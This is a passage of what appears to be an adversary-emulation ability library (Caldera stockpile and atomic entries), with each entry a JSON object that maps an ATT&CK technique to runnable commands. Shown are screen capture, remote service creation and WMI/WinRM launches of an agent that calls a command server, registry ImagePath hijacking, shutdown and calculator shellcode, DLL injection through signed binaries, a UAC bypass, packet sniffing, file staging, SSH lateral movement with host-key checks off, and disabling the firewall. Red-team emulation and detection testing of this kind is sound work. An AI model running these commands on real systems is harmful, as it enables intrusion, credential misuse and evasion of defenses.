                "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.screenshot.png",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;",
                "name": "pwsh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.screenshot.png",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "capture the contents of the screen",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Screen Capture",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "95727b87-175c-4a69-8c7a-a5d82746a753",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "technique_id": "T1569.002",
        "executors": [
            {
                "timeout": 300,
                "cleanup": [
                    "sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI \"Imagename eq s4ndc4t.exe\""
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= \"cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}\" displayname= \"Sandcat Execution\";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Service Creation",
        "tactic": "execution",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.no_backwards_movement",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "72249c1e9ffe7d8f30243d838e0791ca",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
        "technique_id": "T1574.011",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "sc.exe delete calcservice"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\" /f /v ImagePath /d \"%windir%\\system32\\cmd.exe\"",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Service ImagePath Change with reg.exe",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c240b81112d5652659a74aadd862256b",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
        "technique_id": "T1574.011",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Service Registry Permissions Weakness",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "0821b0b0-7902-4a7b-8052-80bda5a43684",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Endpoint Denial of Service",
        "technique_id": "T1499",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05",
                "name": "shellcode_amd64",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05",
                "name": "shellcode_386",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Force shutdown a target system using Process Injection and raw shellcode",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Shutdown Target System",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "e5bcefee-262d-4568-a261-e8a20855ec81",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Process Injection: Portable Executable Injection",
        "technique_id": "T1055.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Leverage Mavinject (signed binary) for DLL injection",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Signed Binary Execution - Mavinject",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Process Injection: Dynamic-link Library Injection",
        "technique_id": "T1055.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Leverage odbcconf for DLL injection",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Signed Binary Execution - odbcconf",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3fc35f10c72ccb131d55242e66ea1d0b",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "technique_id": "T1083",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "remove-item $env:temp\\T1083Test5.txt -ErrorAction SilentlyContinue"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\"); Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = \"$env:homedrive\\Users\\\"; foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach ($secondarydirectory in $folderarray);  {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; }; cat $env:temp\\T1083Test5.txt",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Simulating MAZE Directory Enumeration",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b7344901-0b02-4ead-baf6-e3f629ed545f",
        "buckets": [
            "privilege-escalation"
        ],
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "technique_id": "T1548.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "Akagi64.exe"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "executes the slui exe file handler hijack",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Slui File Handler Hijack",
        "tactic": "privilege-escalation",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b6f545ef-f802-4537-b59d-2cb19831c8ed",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "technique_id": "T1016",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ifconfig | grep broadcast",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Capture the local network broadcast IP address",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Snag broadcast IP",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
        "buckets": [
            "credential-access"
        ],
        "privilege": "Elevated",
        "technique_name": "Network Sniffing",
        "technique_id": "T1040",
        "executors": [
            {
                "timeout": 80,
                "cleanup": [
                    "Remove-NetEventSession -Name \"PCAP\";\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tcpdump -i en0 & sleep 5; kill $!",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Perform a packet capture",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Sniff network traffic",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a42dfc86-12f0-4f06-b0cf-24830c7f61f4",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Process Injection",
        "technique_id": "T1055",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3",
                "name": "shellcode_amd64",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Start a new calculator process",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Spawn calculator (shellcode)",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "technique_id": "T1074.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cp \"#{host.file.path[filters(technique=T1005,max=1)]}\" #{host.dir.staged[filters(max=1)]}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cp \"#{host.file.path[filters(technique=T1005,max=1)]}\" #{host.dir.staged[filters(max=1)]}",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Copy-Item #{host.file.path[filters(technique=T1005,max=1)]} #{host.dir.staged[filters(max=1)]}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "copy #{host.file.path[filters(technique=T1005,max=1)]} #{host.dir.staged[filters(max=1)]}",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "copy files to staging directory",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Stage sensitive files",
        "tactic": "collection",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.file.path"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "b1d41972-3ad9-4aa1-8f7f-05f049a2980e",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Unix Shell",
        "technique_id": "T1059.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "pkill -f sandcat"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nohup ./sandcat.go -server #{server} &",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "pkill -f sandcat"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nohup ./sandcat.go -server #{server} &",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Start a new 54ndc47 agent in background",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Start 54ndc47",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "10a9d979-e342-418a-a9b0-002c483e0fa6",
        "buckets": [
            "lateral-movement"
        ],
        "privilege": "",
        "technique_name": "Remote Services: SSH",
        "technique_id": "T1021.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-darwin"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-linux"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Start 54ndc47",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "technique_id": "T1047",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\""
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\""
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Remotely executes 54ndc47 over WMI",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Start 54ndc47 (WMI)",
        "tactic": "execution",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.basic",
                "relationship_match": [
                    {
                        "source": "domain.user.name",
                        "edge": "has_password",
                        "target": "domain.user.password"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.basic",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_54ndc47_copy"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.req_like",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_admin",
                        "target": "domain.user.name"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.no_backwards_movement",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.reachable",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921",
        "buckets": [
            "lateral-movement"
        ],
        "privilege": "",
        "technique_name": "Remote Services: Windows Remote Management",
        "technique_id": "T1021.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-windows"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Start Agent using WinRM (WinRM)",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Start Agent (WinRM)",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "134b49a3-3f93-41bd-85f4-563eadbb6055",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-Process -Name \"powershell\" | Stop-Process",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Kill all PowerShell processes",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Stop PowerShell processes",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8478297ebb155b34c412a0fde335eccd",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "ufw enable; ufw status verbose"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ufw disable",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Stop/Start UFW firewall",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "da03142f3c859db6a08d57accc7d2aa8",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "systemctl start ufw; systemctl status ufw"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "systemctl stop ufw",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Stop/Start UFW firewall systemctl",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "cc191baa-7472-4386-a2f4-42f203f1acfd",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
